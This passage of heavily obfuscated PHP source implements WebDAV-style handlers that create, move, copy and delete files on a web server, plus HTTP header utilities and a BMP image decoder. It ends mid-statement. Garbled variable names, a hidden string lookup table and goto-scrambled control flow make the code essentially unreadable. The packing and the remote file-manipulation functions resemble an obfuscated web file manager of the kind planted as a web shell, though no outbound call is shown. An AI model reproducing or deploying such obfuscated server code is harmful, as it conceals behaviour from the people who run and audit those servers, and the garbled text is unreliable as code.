$_SERVER[í™]; if ($this->pathExists($this->path)) { return array($bÜÀèñ¡”ë[1018] => 409); } $CßÈ­¨ŒŒ¢ = $this->pathMkdir($this->path); return array($bÜÀèñ¡”ë[1018] => $CßÈ­¨ŒŒ¢ ? 201 : 403); } public function httpMOVE() { $e¨¢™‰ÊŒ =& $_SERVER[í™]; $E°êÍ¡š¶“ = $this->parsePath($this->pathGet(!0)); if (isset($_SERVER[$e¨¢™‰ÊŒ[1802]])) { $b¦­î´…â[$e¨¢™‰ÊŒ[1803]] = $_SERVER[$e¨¢™‰ÊŒ[1802]] == $e¨¢™‰ÊŒ[1804]; } $AìºÑ—œ¾ = $this->pathMove($this->path, $E°êÍ¡š¶“); return array($e¨¢™‰ÊŒ[1018] => $AìºÑ—œ¾ ? 201 : 404); } public function httpCOPY() { $eè ÍÅ¨’ = $this->parsePath($this->pathGet(!0)); $Dš‘‹ŠÂ²Œ = $this->pathCopy($this->path, $eè ÍÅ¨’); return array($_SERVER[í™][1018] => $Dš‘‹ŠÂ²Œ ? 201 : 404); } public function httpDELETE() { $D²ŒèâÇ˜¼ = $this->pathRemove($this->path); return array($_SERVER[í™][1018] => $D²ŒèâÇ˜¼ ? 200 : 503); } public function httpLOCK() { $C¥®¡ó¾Ê¸ =& $_SERVER[í™]; $fŒ®É ·Ş· = md5($this->path); $c®»¯´¾¤ = $C¥®¡ó¾Ê¸[1805] . $this->xmlGet($C¥®¡ó¾Ê¸[1806]) . $C¥®¡ó¾Ê¸[1807] . $fŒ®É ·Ş· . $C¥®¡ó¾Ê¸[1808]; return array($C¥®¡ó¾Ê¸[1018] => 200, $C¥®¡ó¾Ê¸[1193] => array($C¥®¡ó¾Ê¸[1809] . $fŒ®É ·Ş·, $C¥®¡ó¾Ê¸[1810]), $C¥®¡ó¾Ê¸[1811] => $c®»¯´¾¤); } public function httpUNLOCK() { return array($_SERVER[í™][1018] => 204); } public function xmlGet($cŠ§ ğÜÎ¨) { goto a £­ò¯; aàŒŠŸĞ“: if ($DÓ¾Ëˆ‹¼) { return $DÓ¾Ëˆ‹¼[0]->nodeValue; } return $EÈ¡çÏØ›â[33]; goto a¬çÙ¡«–Œ; a £­ò¯: $EÈ¡çÏØ›â =& $_SERVER[í™]; static $c¬ŸºÃ÷Ç¯ = false; if (!$c¬ŸºÃ÷Ç¯) { $cªÃßÌ¸Ú = file_get_contents($EÈ¡çÏØ›â[1812]); $c¬ŸºÃ÷Ç¯ = new DOMDocument(); $c¬ŸºÃ÷Ç¯->loadXML($cªÃßÌ¸Ú); } goto A‰¨¿‰Œ¼; A‰¨¿‰Œ¼: $Aˆ½á™å¿ã = explode($EÈ¡çÏØ›â[8], $cŠ§ ğÜÎ¨); $D¤‰Á¥’ê« = array_shift($Aˆ½á™å¿ã); $DÓ¾Ëˆ‹¼ = $c¬ŸºÃ÷Ç¯->getElementsByTagNameNS($EÈ¡çÏØ›â[1813], $D¤‰Á¥’ê«); goto aàŒŠŸĞ“; a¬çÙ¡«–Œ: } public static function response($C¹Ş í‚˜ƒ) { goto DÜŠëÁâÑœ; f˜Ïƒ”¢œ: if (is_string($C¹Ş í‚˜ƒ[$E¦‰«òº¸º[1811]])) { header($E¦‰«òº¸º[1814]); $e‘•§Æ×À = $E¦‰«òº¸º[1815] . $E¦‰«òº¸º[217] . $C¹Ş í‚˜ƒ[$E¦‰«òº¸º[1811]]; echo $e‘•§Æ×À; } goto aÑ‡‰ÍÆ‰; DÜŠëÁâÑœ: $E¦‰«òº¸º =& $_SERVER[í™]; $B½ï‘„Ä´† = is_array($C¹Ş í‚˜ƒ[$E¦‰«òº¸º[1193]]) ? $C¹Ş í‚˜ƒ[$E¦‰«òº¸º[1193]] : array(); $B½ï‘„Ä´†[] = HttpHeader::code($C¹Ş í‚˜ƒ[$E¦‰«òº¸º[1018]]); goto D‰­Ì‹¾Ì«; D‰­Ì‹¾Ì«: $B½ï‘„Ä´†[] = $E¦‰«òº¸º[1753]; $B½ï‘„Ä´†[] = $E¦‰«òº¸º[1754]; foreach ($B½ï‘„Ä´† as $e½‘ÉßÃ·š) { header($e½‘ÉßÃ·š); } goto f˜Ïƒ”¢œ; aÑ‡‰ÍÆ‰: } } class HttpHeader { public static $_headers = array("\110\157\163\x74" => "\110\x54\124\120\x5f\x48\117\123\124", "\125\163\x65\162\55\101\x67\x65\156\x74" => "\x48\x54\x54\x50\x5f\x55\x53\105\x52\137\x41\x47\105\x4e\124", "\103\x6f\x6e\x74\145\x6e\164\55\124\x79\x70\x65" => "\x48\124\x54\x50\137\103\x4f\116\124\x45\x4e\124\x5f\124\x59\x50\x45", "\x43\x6f\x6e\x74\145\x6e\164\55\x4c\145\x6e\x67\x74\150" => "\110\x54\x54\120\137\x43\117\116\x54\105\116\x54\x5f\114\105\x4e\107\124\110", "\104\x65\160\x74\x68" => "\x48\x54\124\x50\x5f\x44\x45\120\x54\x48", "\x45\170\x70\145\x63\164" => "\110\x54\x54\x50\x5f\105\130\120\105\103\x54", "\111\x66\55\x4e\157\x6e\145\x2d\115\141\164\x63\150" => "\x48\x54\x54\120\137\111\106\x5f\x4e\x4f\x4e\105\137\x4d\101\x54\103\110", "\x49\146\55\115\141\x74\x63\x68" => "\110\124\124\x50\137\x49\106\137\115\101\x54\103\110", "\111\x66\55\122\141\x6e\147\145" => "\110\x54\124\120\137\111\106\x5f\x52\101\x4e\107\x45", "\x4c\141\x73\x74\x2d\x4d\x6f\x64\151\x66\151\145\x64" => "\110\x54\x54\x50\137\114\x41\x53\124\x5f\115\x4f\104\x49\x46\x49\x45\x44", "\x49\x66\x2d\x4d\x6f\x64\x69\x66\151\x65\x64\x2d\x53\x69\x6e\143\x65" => "\110\x54\x54\120\137\111\x46\137\x4d\x4f\104\x49\x46\111\x45\104\137\123\111\116\103\x45", "\111\x66\55\125\156\x6d\157\x64\151\x66\151\x65\x64\x2d\123\x69\x6e\143\145" => "\x48\x54\124\120\x5f\x49\x46\137\125\x4e\x4d\117\x44\111\106\x49\x45\x44\137\x53\x49\x4e\x43\105", "\122\141\x6e\x67\x65" => "\110\124\x54\120\137\x52\x41\116\x47\x45", "\x54\x69\x6d\145\x6f\165\x74" => "\x48\x54\124\x50\x5f\124\111\x4d\x45\x4f\125\124", "\111\146" => "\110\124\x54\120\x5f\111\106", "\114\x6f\x63\153\55\x54\x6f\x6b\x65\x6e" => "\110\x54\x54\120\x5f\114\117\103\113\137\x54\x4f\x4b\x45\116", "\117\x76\x65\162\167\162\151\164\x65" => "\110\124\x54\120\137\x4f\x56\x45\x52\x57\122\x49\x54\x45", "\104\145\x73\x74\x69\x6e\x61\164\151\157\156" => "\110\124\x54\120\137\104\x45\x53\x54\x49\116\x41\124\111\x4f\116", "\122\145\161\165\x65\x73\x74\x2d\x49\144" => "\x52\x45\x51\125\105\x53\x54\x5f\111\x44", "\x52\x65\x71\165\x65\163\164\55\102\x6f\144\x79\55\106\x69\154\x65" => "\x52\105\x51\125\105\123\x54\x5f\x42\x4f\104\131\x5f\106\x49\x4c\105", "\122\145\x64\151\162\145\143\164\55\123\164\x61\x74\x75\x73" => "\122\x45\x44\111\x52\105\x43\124\137\123\x54\101\x54\x55\x53"); public static function init() { static $F¤•ÍŸ‚–á = false; if ($F¤•ÍŸ‚–á) { return; } foreach ($_SERVER as $e´ï˜† ºá => $b½Ÿİ²¼ğ) { $e´ï˜† ºá = strtoupper($e´ï˜† ºá); if (!array_key_exists($e´ï˜† ºá, $_SERVER)) { continue; } $_SERVER[$e´ï˜† ºá] = $b½Ÿİ²¼ğ; } foreach (self::$_headers as $e´ï˜† ºá => $fŸ¯Îœ‘ËÛ) { if (!array_key_exists($e´ï˜† ºá, $_SERVER)) { continue; } $_SERVER[$e´ï˜† ºá] = $_SERVER[$fŸ¯Îœ‘ËÛ]; $_SERVER[strtoupper($e´ï˜† ºá)] = $_SERVER[$fŸ¯Îœ‘ËÛ]; } } public static function get($cŞ‡ÇŒ´Ş‹) { self::init(); return $_SERVER[$cŞ‡ÇŒ´Ş‹] ? $_SERVER[$cŞ‡ÇŒ´Ş‹] : $_SERVER[$_SERVER[í™][1816] . strtoupper($cŞ‡ÇŒ´Ş‹)]; } public static function method() { return strtoupper(self::get($_SERVER[í™][154])); } public static function length() { $dĞ¬Ø˜²Ê© =& $_SERVER[í™]; $E«ØÊíğ¿ß = self::get($dĞ¬Ø˜²Ê©[1817]); if (!$E«ØÊíğ¿ß) { $E«ØÊíğ¿ß = self::get($dĞ¬Ø˜²Ê©[1132]); } return $E«ØÊíğ¿ß; } public static function range() { $c¹¹¿¹Ã‹ =& $_SERVER[í™]; $F‚“®†°Ê = self::get($c¹¹¿¹Ã‹[198]); if (!$F‚“®†°Ê) { return !1; } if (!preg_match($c¹¹¿¹Ã‹[1818], $F‚“®†°Ê, $DŠ£œßáå)) { return !1; } if ($DŠ£œßáå[1] === $c¹¹¿¹Ã‹[33] && $DŠ£œßáå[2] === $c¹¹¿¹Ã‹[33]) { return !1; } return array($DŠ£œßáå[1] !== $c¹¹¿¹Ã‹[33] ? $DŠ£œßáå[1] : null, $DŠ£œßáå[2] !== $c¹¹¿¹Ã‹[33] ? $DŠ£œßáå[2] : null); } public static $statusCode = array("\61\60\60" => "\x43\x6f\x6e\x74\151\x6e\x75\x65", "\x31\60\61" => "\x53\167\x69\164\143\150\151\156\147\x20\120\x72\157\164\157\x63\x6f\154", "\x31\60\x32" => "\120\x72\157\x63\x65\163\163\151\156\147", "\x31\60\x33" => "\105\x61\162\x6c\171\x20\x48\151\x6e\164\x73", "\x32\x30\x30" => "\x4f\x4b", "\x32\60\61" => "\x43\x72\x65\x61\164\145\x64", "\62\x30\x32" => "\101\143\x63\x65\160\164\145\x64", "\x32\60\63" => "\x4e\x6f\x6e\55\101\165\x74\150\157\162\151\164\141\164\x69\166\x65\40\111\x6e\x66\x6f\162\155\x61\x74\151\x6f\156", "\62\60\x34" => "\116\x6f\x20\103\157\156\164\x65\x6e\x74", "\62\x30\65" => "\x52\x65\163\145\x74\x20\x43\157\156\164\145\156\x74", "\x32\x30\x36" => "\120\141\x72\x74\x69\141\154\40\x43\x6f\x6e\164\145\156\164", "\x32\60\67" => "\115\x75\x6c\164\x69\55\x53\x74\141\x74\165\163", "\63\60\60" => "\x4d\x75\x6c\x74\151\160\154\x65\40\103\150\157\x69\143\x65\163", "\x33\60\61" => "\x4d\157\166\145\x64\40\x50\145\162\155\141\156\145\x6e\x74\154\171", "\x33\x30\x32" => "\106\157\165\156\x64", "\x33\60\63" => "\x53\x65\x65\40\117\164\150\145\162", "\x33\60\64" => "\116\x6f\x74\x20\115\157\x64\x69\x66\151\145\x64", "\63\x30\x35" => "\125\x73\x65\x20\120\x72\157\x78\x79", "\63\60\x37" => "\124\145\155\x70\x6f\x72\x61\162\x79\x20\122\x65\144\151\162\145\143\x74", "\63\60\x38" => "\120\145\x72\155\x61\x6e\x65\156\164\40\x52\145\144\151\162\x65\143\164", "\x34\60\60" => "\x42\x61\144\x20\122\x65\x71\165\145\x73\x74", "\64\60\x31" => "\x55\156\x61\x75\164\x68\157\162\151\x7a\145\x64", "\x34\x30\62" => "\x50\x61\x79\x6d\145\x6e\164\x20\x52\x65\x71\x75\x69\162\x65\x64", "\x34\x30\x33" => "\106\157\x72\x62\x69\144\x64\x65\156", "\x34\60\64" => "\x4e\157\x74\40\x46\157\165\x6e\144", "\64\x30\65" => "\x4d\145\164\x68\x6f\x64\x20\x4e\x6f\164\40\x41\x6c\154\x6f\x77\x65\144", "\x34\x30\x36" => "\x4e\x6f\164\x20\x41\x63\x63\x65\x70\164\141\x62\154\x65", "\x34\x30\67" => "\x50\x72\x6f\x78\x79\x20\x41\165\x74\x68\x65\x6e\x74\151\x63\141\164\x69\157\156\x20\122\x65\x71\165\151\x72\145\x64", "\64\x30\x38" => "\x52\145\x71\165\x65\x73\x74\x20\x54\151\155\145\157\x75\164", "\64\60\x39" => "\103\x6f\x6e\146\154\x69\143\x74", "\64\x31\x30" => "\x47\x6f\x6e\145", "\x34\x31\x31" => "\x4c\x65\x6e\147\x74\x68\40\x52\x65\161\165\151\162\x65\x64", "\64\61\x32" => "\x50\162\x65\x63\157\156\144\x69\x74\151\x6f\x6e\x20\x46\141\151\x6c\x65\x64", "\64\x31\x33" => "\x52\x65\161\165\x65\x73\x74\x20\105\156\164\151\164\171\40\124\x6f\x6f\x20\114\141\x72\x67\145", "\x34\61\x34" => "\x52\x65\161\165\x65\x73\164\40\x55\122\x49\40\x54\x6f\157\40\x4c\x61\x72\147\x65", "\x34\61\65" => "\125\156\x73\x75\160\160\157\x72\164\x65\144\40\x4d\145\x64\151\141\x20\124\x79\x70\145", "\x34\61\x36" => "\x52\145\161\x75\x65\163\164\x65\x64\40\122\141\156\147\x65\x20\x4e\x6f\x74\x20\x53\141\164\x69\x73\x66\151\141\142\x6c\x65", "\x34\x31\67" => "\105\170\x70\x65\x63\164\141\x74\151\x6f\156\40\106\141\151\154\145\x64", "\64\62\62" => "\125\x6e\x70\162\x6f\x63\x65\x73\x73\x61\x62\154\145\40\105\156\164\151\x74\171", "\x34\x32\x33" => "\x4c\x6f\143\x6b\145\x64", "\x34\x32\64" => "\x46\141\151\x6c\x65\144\x20\x44\145\x70\145\156\x64\x65\x6e\143\x79", "\64\x32\x35" => "\125\x6e\x6f\162\144\x65\162\x65\144\x20\x43\157\x6c\154\x65\143\x74\151\157\156", "\64\62\x36" => "\125\x70\x67\x72\x61\x64\x65\40\122\145\161\165\x69\162\145\x64", "\x34\62\70" => "\120\162\x65\x63\157\156\144\151\x74\x69\x6f\156\x20\x52\x65\x71\165\x69\162\x65\144", "\64\62\71" => "\124\x6f\x6f\40\x4d\141\x6e\x79\40\122\x65\x71\165\145\163\164\x73", "\64\63\61" => "\x52\x65\161\165\x65\163\x74\x20\110\x65\141\144\x65\162\40\x46\151\145\x6c\144\x73\40\124\157\157\40\114\x61\x72\147\145", "\x34\x34\64" => "\x4e\157\x20\122\145\x73\x70\157\x6e\163\145", "\64\x35\x30" => "\102\x6c\157\x63\x6b\145\144\40\142\x79\40\127\x69\x6e\144\157\x77\x73\40\x50\141\162\x65\156\x74\141\x6c\x20\x43\157\156\164\162\157\x6c\163", "\64\x35\61" => "\x55\156\x61\166\141\x69\154\141\142\154\x65\40\106\157\x72\x20\114\145\147\x61\x6c\40\x52\x65\141\x73\157\156\x73", "\x34\x39\x34" => "\122\x65\x71\x75\145\163\x74\x20\110\x65\x61\144\x65\162\x20\124\x6f\157\x20\114\x61\162\147\x65", "\x35\60\60" => "\111\156\x74\145\162\156\141\154\40\x53\x65\162\x76\145\x72\40\105\162\x72\x6f\162", "\65\x30\x31" => "\116\x6f\x74\x20\x49\155\x70\x6c\x65\155\x65\156\x74\x65\x64", "\65\60\x32" => "\x42\x61\144\40\x47\x61\x74\145\x77\141\x79", "\65\60\x33" => "\123\145\162\166\x69\x63\x65\40\125\x6e\141\166\141\151\154\x61\142\x6c\x65", "\65\x30\x34" => "\x47\141\x74\145\x77\x61\171\x20\124\x69\x6d\145\157\165\164", "\x35\60\x35" => "\x48\x54\x54\120\x20\126\x65\162\163\x69\157\x6e\x20\x6e\157\164\x20\x73\x75\x70\x70\157\x72\x74\145\x64", "\x35\60\67" => "\x49\x6e\x73\165\146\146\x69\143\151\x65\156\x74\x20\x53\164\157\162\x61\147\145"); public static function code($BÅÏâÈ±ì˜) { $CİİÀ‘øö° =& $_SERVER[í™]; $BÅÏâÈ±ì˜ = $BÅÏâÈ±ì˜ . $CİİÀ‘øö°[33]; $AáŒ¡¡•© = self::$statusCode[$BÅÏâÈ±ì˜]; $AáŒ¡¡•© = $AáŒ¡¡•© ? "\110\x54\x54\x50\x2f\x31\x2e\x31\40{$BÅÏâÈ±ì˜}\40" . $AáŒ¡¡•© : $CİİÀ‘øö°[33]; return $AáŒ¡¡•©; } } class ImageGdBMP { public static function load($A”ßöä…º) { $Cö¬×óÅ¤¸ = fopen($A”ßöä…º, $_SERVER[í™][1507]); if ($Cö¬×óÅ¤¸ === !1) { return !1; } $B¬æ•õ–¹Ó = self::loadFromStream($Cö¬×óÅ¤¸); fclose($Cö¬×óÅ¤¸); return $B¬æ•õ–¹Ó; } public static function loadFromStream($F”ÇÂé•¾ê) { $FÕŞˆˆ±èÉ =& $_SERVER[í™]; $eÜÇíŠÊ  = fread($F”ÇÂé•¾ê, 14); if ($eÜÇíŠÊ  === !1) { return !1; } if ($eÜÇíŠÊ [0] != $FÕŞˆˆ±èÉ[1819] || $eÜÇíŠÊ [1] != $FÕŞˆˆ±èÉ[1820]) { return !1; } $d‘ÔÀÚ—Î‰ = unpack($FÕŞˆˆ±èÉ[1821] . $FÕŞˆˆ±èÉ[1822] . $FÕŞˆˆ±èÉ[1823] . $FÕŞˆˆ±èÉ[1824] . $FÕŞˆˆ±èÉ[1825], $eÜÇíŠÊ ); return self::loadFromStreamAndFileHeader($F”ÇÂé•¾ê, $d‘ÔÀÚ—Î‰); } public static function loadFromStreamAndFileHeader($Eéùöå‹›î, array $cñÏ©ßÅ»§) { goto AÃé­šÁÎÀ; AÃé­šÁÎÀ: $E×¹ÑÖƒÈÛ =& $_SERVER[í™]; if ($cñÏ©ßÅ»§[$E×¹ÑÖƒÈÛ[388]] != 19778) { return !1; } $d“›·Š´Ñî = fread($Eéùöå‹›î, 4); goto fµê—¨Á; Fœïášˆéç: $E Šƒ¡¬é± = abs($b¥ĞÌ¢í); $bËá°õËÍÙ = $b¥ĞÌ¢í > 0 ? $E Šƒ¡¬é± - 1 : 0; $aÈ˜Ñƒì¡ñ = $b¥ĞÌ¢í > 0 ? -1 : 1; goto aÛ¡õİ¶ğ; fµê—¨Á: if ($d“›·Š´Ñî === !1) { return !1; } list(, $E…ªÇ‚’‰£) = unpack($E×¹ÑÖƒÈÛ[1826], $d“›·Š´Ñî); if ($E…ªÇ‚’‰£ == 12) { goto E¿³ŠİÉ±; DèÃô›‰ºÂ: $d‚«Œ¤µ‚ = 255; goto Aù©¶ÜĞ¬ñ; E¿³ŠİÉ±: $d“›·Š´Ñî = fread($Eéùöå‹›î, $E…ªÇ‚’‰£ - 4); if ($d“›·Š´Ñî === !1) { return !1; } extract(unpack($E×¹ÑÖƒÈÛ[1827] . $E×¹ÑÖƒÈÛ[1828] . $E×¹ÑÖƒÈÛ[1829] . $E×¹ÑÖƒÈÛ[1830], $d“›·Š´Ñî)); goto Eçƒ¡¸ö‰å; Eçƒ¡¸ö‰å: $Bà¥÷Ğä = $cÄôõÎ­ = $fŠ¸‚Ä¯ = $cÌÀ«¥œÖ = 0; $dœĞÍ¾Ñ­– = 16711680; $Dè®ÇÖÄÈ¼ = 65280; goto DèÃô›‰ºÂ; Aù©¶ÜĞ¬ñ: } else { if (124 < $E…ªÇ‚’‰£ || $E…ªÇ‚’‰£ < 40) { return !1; } else { goto Eì‰‘ˆ©æ²; eƒ­‹ó‚œœ: if ($Cë›‡¶ÈÛ & 2147483648) { $Cë›‡¶ÈÛ = -(~$Cë›‡¶ÈÛ & 4294967295) - 1; } if ($b¥ĞÌ¢í & 2147483648) { $b¥ĞÌ¢í = -(~$b¥ĞÌ¢í & 4294967295) - 1; } if ($b’—Í©¤“Å & 2147483648) { $b’—Í©¤“Å = -(~$b’—Í©¤“Å & 4294967295) - 1; } goto b´®­»¯Ñš; b´®­»¯Ñš: if ($cõË®­œœ¬ & 2147483648) { $cõË®­œœ¬ = -(~$cõË®­œœ¬ & 4294967295) - 1; } if ($cñÏ©ßÅ»§[$E×¹ÑÖƒÈÛ[522]] != 0) { $c„õøƒÏÀ = $E¼º™ëãŞ… == 1 || $E¼º™ëãŞ… == 4 || $E¼º™ëãŞ… == 8 ? ($Bà¥÷Ğä ? $Bà¥÷Ğä : pow(2, $E¼º™ëãŞ…)) << 2 : 0; $CéÒ™ÀõÏÙ = $b”»Ø­ÖĞ ? $b”»Ø­ÖĞ : ($Cë›‡¶ÈÛ * $E¼º™ëãŞ… + 31 >> 3 & ~3) * abs($b¥ĞÌ¢í); $aĞ„ô£·¸˜ = $cñÏ©ßÅ»§[$E×¹ÑÖƒÈÛ[522]] - $CéÒ™ÀõÏÙ - $c„õøƒÏÀ - 14; if ($E…ªÇ‚’‰£ < $aĞ„ô£·¸˜ && 40 <= $E…ªÇ‚’‰£ && $E…ªÇ‚’‰£ <= 124) { $E…ªÇ‚’‰£ = $aĞ„ô£·¸˜; } } if ($E…ªÇ‚’‰£ - 40 > 0) { $d“›·Š´Ñî = fread($Eéùöå‹›î, $E…ªÇ‚’‰£ - 40); if ($d“›·Š´Ñî === !1) { return !1; } extract(unpack($E×¹ÑÖƒÈÛ[1840] . $E×¹ÑÖƒÈÛ[1841] . $E×¹ÑÖƒÈÛ[1842] . $E×¹ÑÖƒÈÛ[1843], $d“›·Š´Ñî . str_repeat($E×¹ÑÖƒÈÛ[1844], 120))); } else { $fŠ¸‚Ä¯ = $dœĞÍ¾Ñ­– = $Dè®ÇÖÄÈ¼ = $d‚«Œ¤µ‚ = 0; } goto A„°‘Ë; Eì‰‘ˆ©æ²: $d“›·Š´Ñî = fread($Eéùöå‹›î, 36); if ($d“›·Š´Ñî === !1) { return !1; } extract(unpack($E×¹ÑÖƒÈÛ[1831] . $E×¹ÑÖƒÈÛ[1832] . $E×¹ÑÖƒÈÛ[1829] . $E×¹ÑÖƒÈÛ[1833] . $E×¹ÑÖƒÈÛ[1834] . $E×¹ÑÖƒÈÛ[1835] . $E×¹ÑÖƒÈÛ[1836] . $E×¹ÑÖƒÈÛ[1837] . $E×¹ÑÖƒÈÛ[1838] . $E×¹ÑÖƒÈÛ[1839], $d“›·Š´Ñî)); goto eƒ­‹ó‚œœ; A„°‘Ë: if (($E¼º™ëãŞ… == 16 || $E¼º™ëãŞ… == 24 || $E¼º™ëãŞ… == 32) && $cÌÀ«¥œÖ == 0 && $dœĞÍ¾Ñ­– == 0 && $Dè®ÇÖÄÈ¼ == 0 && $d‚«Œ¤µ‚ == 0) { switch ($E¼º™ëãŞ…) { case 16: $dœĞÍ¾Ñ­– = 31744; $Dè®ÇÖÄÈ¼ = 992; $d‚«Œ¤µ‚ = 31; break; case 24: case 32: $dœĞÍ¾Ñ­– = 16711680; $Dè®ÇÖÄÈ¼ = 65280; $d‚«Œ¤µ‚ = 255; break; } } goto E¼ê™…ù×¾; E¼ê™…ù×¾: } } goto EŸÛÚ‰Í™; EŸÛÚ‰Í™: if ($Cë›‡¶ÈÛ == 0 || $b¥ĞÌ¢í == 0 || $Dø‰¸çÁ°Ã != 1 || ($fŠ¸‚Ä¯ & $dœĞÍ¾Ñ­–) != 0 || ($fŠ¸‚Ä¯ & $Dè®ÇÖÄÈ¼) != 0 || ($fŠ¸‚Ä¯ & $d‚«Œ¤µ‚) != 0 || ($dœĞÍ¾Ñ­– & $Dè®ÇÖÄÈ¼) != 0 || ($dœĞÍ¾Ñ­– & $d‚«Œ¤µ‚) != 0 || ($Dè®ÇÖÄÈ¼ & $d‚«Œ¤µ‚) != 0) { return !1; } if ($cÌÀ«¥œÖ == 4 || $cÌÀ«¥œÖ == 5) { $d“›·Š´Ñî = stream_get_contents($Eéùöå‹›î, $b”»Ø­ÖĞ); if ($d“›·Š´Ñî === !1) { return !1; } return imagecreatefromstring($d“›·Š´Ñî); } $bÏïÆğÇïğ = $Cë›‡¶ÈÛ * $E¼º™ëãŞ… + 31 >> 3 & ~3; goto Fœïášˆéç; aÛ¡õİ¶ğ: if ($E¼º™ëãŞ… == 1 || $E¼º™ëãŞ… == 4 || $E¼º™ëãŞ… == 8) { goto DÍÀŠš—Çá; DÍÀŠš—Çá: $D‚½Ô‹àèÎ = imagecreate($Cë›‡¶ÈÛ, $E Šƒ¡¬é±); $Eø½ŠÈ¸»– = $E…ªÇ‚’‰£ == 12 ? 3 : 4; $cçˆ—É«âö = $Bà¥÷Ğä ? $Bà¥÷Ğä : pow(2, $E¼º™ëãŞ…); goto d„ÙØÇ…·; Få³Š¤–î: $dùïµëÌ = (1 << $E¼º™ëãŞ…) - 1 << $E‘İÕ¹ÊØâ; if ($cÌÀ«¥œÖ == 1 || $cÌÀ«¥œÖ == 2) { $A¡ÅÈÖšš× = 0; $EÇÚ½–Ö³ = $E¼º™ëãŞ… >> 2 & 1; for (;;) { if ($A¡ÅÈÖšš× < -1 || $A¡ÅÈÖšš× > $Cë›‡¶ÈÛ || $bËá°õËÍÙ < -1 || $bËá°õËÍÙ > $b¥ĞÌ¢í) { imagedestroy($D‚½Ô‹àèÎ); return !1; } $d“›·Š´Ñî = fread($Eéùöå‹›î, 1); if ($d“›·Š´Ñî === !1) { imagedestroy($D‚½Ô‹àèÎ); return !1; } switch ($d“›·Š´Ñî) { case $E×¹ÑÖƒÈÛ[1844]: $d“›·Š´Ñî = fread($Eéùöå‹›î, 1); if ($d“›·Š´Ñî === !1) { imagedestroy($D‚½Ô‹àèÎ); return !1; } switch ($d“›·Š´Ñî) { case $E×¹ÑÖƒÈÛ[1844]: $bËá°õËÍÙ += $aÈ˜Ñƒì¡ñ; $A¡ÅÈÖšš× = 0; break; case $E×¹ÑÖƒÈÛ[1846]: $bËá°õËÍÙ = 0; $A¡ÅÈÖšš× = 0; break 3; case $E×¹ÑÖƒÈÛ[1847]: $d“›·Š´Ñî = fread($Eéùöå‹›î, 2); if ($d“›·Š´Ñî === !1) { imagedestroy($D‚½Ô‹àèÎ); return !1; } list(, $C•ô¶ÒÑ“ª, $eÈ¯³œÇ¨) = unpack($E×¹ÑÖƒÈÛ[1848], $d“›·Š´Ñî); $A¡ÅÈÖšš× += $C•ô¶ÒÑ“ª; $bËá°õËÍÙ += $eÈ¯³œÇ¨ * $aÈ˜Ñƒì¡ñ; break; default: list(, $fŠË·«”¨) = unpack($E×¹ÑÖƒÈÛ[1849], $d“›·Š´Ñî); $f·‡Ü±æÑ¹ = ($fŠË·«”¨ >> $EÇÚ½–Ö³) + ($fŠË·«”¨ & $EÇÚ½–Ö³); $d“›·Š´Ñî = fread($Eéùöå‹›î, $f·‡Ü±æÑ¹ + 1 & ~1); if ($d“›·Š´Ñî === !1) { imagedestroy($D‚½Ô‹àèÎ); return !1; } for ($DÙİ˜‡Ò©Ë = 0, $d¹‘÷Ÿ¶ = 0; $DÙİ˜‡Ò©Ë < $fŠË·«”¨; ++$DÙİ˜‡Ò©Ë, ++$A¡ÅÈÖšš×, $d¹‘÷Ÿ¶ += $E¼º™ëãŞ…) { list(, $aÔÔ®‡ƒîÎ) = unpack($E×¹ÑÖƒÈÛ[1849], $d“›·Š´Ñî[$d¹‘÷Ÿ¶ >> 3]); $C´È½ÃÙÜ² = $d¹‘÷Ÿ¶ & 7; imagesetpixel($D‚½Ô‹àèÎ, $A¡ÅÈÖšš×, $bËá°õËÍÙ, $d–°–Ç³‘¾[($aÔÔ®‡ƒîÎ & $dùïµëÌ >> $C´È½ÃÙÜ²) >> $E‘İÕ¹ÊØâ - $C´È½ÃÙÜ²]); } break; } break; default: $bäšó‡·Î¯ = fread($Eéùöå‹›î, 1); if ($bäšó‡·Î¯ === !1) { imagedestroy($D‚½Ô‹àèÎ); return !1; } list(, $b±•ìï‡»Œ, $aÔÔ®‡ƒîÎ) = unpack($E×¹ÑÖƒÈÛ[1848], $d“›·Š´Ñî . $bäšó‡·Î¯); for ($DÙİ˜‡Ò©Ë = 0, $d¹‘÷Ÿ¶ = 0; $DÙİ˜‡Ò©Ë < $b±•ìï‡»Œ; ++$DÙİ˜‡Ò©Ë, ++$A¡ÅÈÖšš×, $d¹‘÷Ÿ¶ += $E¼º™ëãŞ…) { $C´È½ÃÙÜ² = $d¹‘÷Ÿ¶ & 7; imagesetpixel($D‚½Ô‹àèÎ, $A¡ÅÈÖšš×, $bËá°õËÍÙ, $d–°–Ç³‘¾[($aÔÔ®‡ƒîÎ & $dùïµëÌ >> $C´È½ÃÙÜ²) >> $E‘İÕ¹ÊØâ - $C´È½ÃÙÜ²]); } break; } } } else { for ($bƒ×Œ›õñ˜ = 0; $bƒ×Œ›õñ˜ < $E Šƒ¡¬é±; ++$bƒ×Œ›õñ˜, $bËá°õËÍÙ += $aÈ˜Ñƒì¡ñ) { $d“›·Š´Ñî = fread($Eéùöå‹›î, $bÏïÆğÇïğ); if ($d“›·Š´Ñî === !1) { imagedestroy($D‚½Ô‹àèÎ); return !1; } $d¹‘÷Ÿ¶ = 0; for ($A¡ÅÈÖšš× = 0; $A¡ÅÈÖšš× < $Cë›‡¶ÈÛ; ++$A¡ÅÈÖšš×, $d¹‘÷Ÿ¶ += $E¼º™ëãŞ…) { list(, $aÔÔ®‡ƒîÎ) = unpack($E×¹ÑÖƒÈÛ[1849], $d“›·Š´Ñî[$d¹‘÷Ÿ¶ >> 3]); $C´È½ÃÙÜ² = $d¹‘÷Ÿ¶ & 7; imagesetpixel($D‚½Ô‹àèÎ, $A¡ÅÈÖšš×, $bËá°õËÍÙ, $d–°–Ç³‘¾[($aÔÔ®‡ƒîÎ & $dùïµëÌ >> $C´È½ÃÙÜ²) >> $E‘İÕ¹ÊØâ - $C´È½ÃÙÜ²]); } } } goto bÎÕ°ÀÑ•ˆ; d„ÙØÇ…·: $d–°–Ç³‘¾ = array(); for ($DÙİ˜‡Ò©Ë = 0; $DÙİ˜‡Ò©Ë < $cçˆ—É«âö; ++$DÙİ˜‡Ò©Ë) { $d“›·Š´Ñî = fread($Eéùöå‹›î, $Eø½ŠÈ¸»–); if ($d“›·Š´Ñî === !1) { imagedestroy($D‚½Ô‹àèÎ); return !1; } extract(unpack($E×¹ÑÖƒÈÛ[1845], $d“›·Š´Ñî . $E×¹ÑÖƒÈÛ[1844])); $d–°–Ç³‘¾[] = imagecolorallocate($D‚½Ô‹àèÎ, 